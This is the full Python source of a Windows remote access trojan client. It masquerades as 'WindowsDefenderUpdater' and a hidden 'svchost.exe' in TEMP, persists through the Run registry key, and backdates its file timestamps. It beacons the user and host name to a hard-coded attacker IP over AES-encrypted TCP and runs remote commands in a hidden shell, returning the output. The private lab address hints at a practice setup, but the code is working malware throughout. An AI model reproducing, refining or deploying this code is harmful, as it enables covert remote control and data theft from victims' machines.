# rat_client.py (Improved Version)
import ctypes
import socket
import subprocess
import os
import sys
import time
import random
import getpass
import struct
from ctypes import *
from ctypes.wintypes import *
import winreg
import shutil
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os as crypto_os

# ===== Configuration =====
ATTACKER_IP = "192.168.56.102"  # Verify this IP is correct
ATTACKER_PORT = 9999
BUFFER_SIZE = 4096
RECONNECT_DELAY = 5
SIMULATE_DELAY = True
SIMULATE_STARTUP_DELAY = random.uniform(1, 5)

PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater"
COPY_TO_TEMP = True
TEMP_FILENAME = "svchost.exe"

SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"  
SALT = b"ratsalt12345678"  

# ===== Initialization =====
ntdll = windll.ntdll
kernel32 = windll.kernel32
current_working_directory = os.path.abspath(os.getcwd())

# ===== Debugging =====
DEBUG_MODE = True  

def debug_print(message):
    """Enhanced debug output with timestamp"""
    if DEBUG_MODE:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[RAT {timestamp}] {message}")

# ===== Encryption Functions =====
backend = default_backend()

def derive_key(password: bytes, salt: bytes) -> bytes:
    """Derives a 32-byte AES key from password and salt"""
    try:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=backend
        )
        return kdf.derive(password)
    except Exception as e:
        debug_print(f"Key derivation failed: {e}")
        return None

try:
    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
    if AES_KEY:
        debug_print("Encryption key successfully derived")
    else:
        debug_print("Encryption disabled - key derivation failed")
except Exception as e:
    debug_print(f"Error during key setup: {e}")
    AES_KEY = None

def encrypt_data(data: str) -> bytes:
    """Secure data encryption with fallback"""
    if not AES_KEY:
        return data.encode('utf-8')
    
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        iv = crypto_os.urandom(16)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        
        # PKCS7 padding
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(iv + ciphertext)
    except Exception as e:
        debug_print(f"Encryption failed: {e}")
        return data if isinstance(data, bytes) else data.encode('utf-8')

def decrypt_data(data: bytes) -> str:
    """Secure data decryption with fallback"""
    if not AES_KEY:
        try:
            return data.decode('utf-8')
        except:
            return str(data)
    
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = base64.b64decode(data)
        if len(encrypted_data) < 16:
            raise ValueError("Data too short for IV")
            
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # More lenient padding validation
        pad_len = padded_plaintext[-1]
        if not 1 <= pad_len <= 16:
            debug_print(f"Invalid padding length: {pad_len}, attempting recovery")
            pad_len = 1  
            
        plaintext = padded_plaintext[:-pad_len]
        return plaintext.decode('utf-8')
    except Exception as e:
        debug_print(f"Decryption failed: {e}")
        try:
            return data.decode('utf-8')
        except:
            return str(data)

# ===== Persistence Functions =====
def add_to_registry():
    """Enhanced persistence installation"""
    try:
        current_path = os.path.abspath(sys.argv[0])
        final_path = current_path

        if COPY_TO_TEMP:
            temp_dir = os.environ.get('TEMP')
            if temp_dir:
                dest_path = os.path.join(temp_dir, TEMP_FILENAME)
                try:
                    shutil.copy2(current_path, dest_path)
                    # Set hidden attribute
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
                    final_path = dest_path
                    debug_print(f"Copied to TEMP as hidden file: {dest_path}")
                except Exception as e:
                    debug_print(f"TEMP copy failed: {e}")

        # Add to registry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, PERSISTENCE_KEY_NAME, 0, winreg.REG_SZ, final_path)
            debug_print(f"Added registry persistence: {final_path}")

        # Additional stealth - set creation time to match system files
        try:
            ctime = os.path.getctime(r"C:\Windows\System32\svchost.exe")
            os.utime(final_path, (ctime, ctime))
        except:
            pass

        return True
    except Exception as e:
        debug_print(f"Persistence failed: {e}")
        return False

# ===== Network Functions =====
def connect_to_server():
    """Robust server connection with retries"""
    while True:
        try:
            debug_print(f"Attempting connection to {ATTACKER_IP}:{ATTACKER_PORT}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)  # Increased timeout
            
            # Enable keepalive
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            sock.settimeout(None)  
            debug_print("Connection established")
            
            # Send initial beacon
            host_info = f"{getpass.getuser()}@{socket.gethostname()}"
            sock.sendall(encrypt_data(f"BEACON:{host_info}"))
            
            return sock
            
        except (socket.timeout, ConnectionRefusedError) as e:
            debug_print(f"Connection failed: {e}, retrying in {RECONNECT_DELAY}s")
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            debug_print(f"Unexpected connection error: {e}")
            time.sleep(RECONNECT_DELAY)

# ===== Command Execution =====
def execute_command(command):
    """Improved command execution with working directory support"""
    global current_working_directory
    
    # Handle CD command
    if command.strip().lower().startswith("cd "):
        try:
            new_dir = command[3:].strip()
            if not new_dir:
                return current_working_directory
                
            if new_dir == "..":
                new_path = os.path.dirname(current_working_directory)
            elif os.path.isabs(new_dir):
                new_path = os.path.abspath(new_dir)
            else:
                new_path = os.path.abspath(os.path.join(current_working_directory, new_dir))
                
            if os.path.isdir(new_path):
                current_working_directory = new_path
                return f"Changed directory to: {new_path}"
            return f"Directory not found: {new_dir}"
        except Exception as e:
            return f"CD error: {str(e)}"
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            cwd=current_working_directory,
            startupinfo=startupinfo
        )
        
        stdout, stderr = process.communicate(timeout=60)
        output = stdout.decode(errors='replace') + stderr.decode(errors='replace')
        return output if output else "[Command executed successfully]"
    except subprocess.TimeoutExpired:
        process.kill()
        return "[Command timed out after 60 seconds]"
    except Exception as e:
        return f"[Command execution error: {str(e)}]"

# ===== Main Function =====
def main():
    debug_print("RAT Client starting...")
    
    # Initial delay if configured
    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)")
        time.sleep(SIMULATE_STARTUP_DELAY)
    
    # Install persistence
    if add_to_registry():
        debug_print("Persistence established")
    else:
        debug_print("Persistence setup failed")
    
    # Main connection loop
    sock = None
    while True:
        try:
            if sock is None:
                sock = connect_to_server()
            
            data = sock.recv(BUFFER_SIZE)
            if not data:
                raise ConnectionError("Server disconnected")
                
            # Decrypt and execute command
            decrypted_cmd = decrypt_data(data)
            debug_print(f"Received command: {decrypted_cmd[:100]}...")  
            
            output = execute_command(decrypted_cmd)
            debug_print(f"Command output: {output[:200]}...")  
            # Send response
            response = f"[{socket.gethostname()}]\n{output}\n"
            sock.sendall(encrypt_data(response))
            
        except (ConnectionResetError, BrokenPipeError):
            debug_print("Connection lost, reconnecting...")
            if sock:
                sock.close()
            sock = None
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            debug_print(f"Error in main loop: {e}")
            if sock:
                sock.close()
            sock = None
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # Check if we were launched with --autorun or from persistence
    if "--autorun" in sys.argv or getattr(sys, 'frozen', False) or not sys.stdin.isatty():
        try:
            main()
        except Exception as e:
            debug_print(f"Fatal error: {e}")
            time.sleep(60)  # Wait before restarting
    else:
        debug_print("Not in autorun mode, exiting")
        sys.exit(0)